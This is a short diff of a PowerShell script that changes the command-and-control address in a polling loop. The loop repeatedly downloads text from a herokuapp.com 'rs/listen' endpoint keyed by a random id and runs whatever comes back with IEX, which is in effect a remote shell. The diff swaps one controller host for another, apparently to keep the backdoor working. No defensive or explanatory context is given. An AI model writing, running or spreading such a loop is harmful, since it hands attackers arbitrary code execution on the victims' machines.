@@ -14,7 +14,7 @@ $id = Get-Random
 $wshell = New-Object -ComObject wscript.shell;
 while (1) 
 {
-$s = (New-Object System.Net.WebClient).DownloadString("http://zochg.herokuapp.com/rs/listen/" + $id);
+$s = (New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/listen/" + $id);
 if ($s -ne $ps) 
 {
 IEX $s
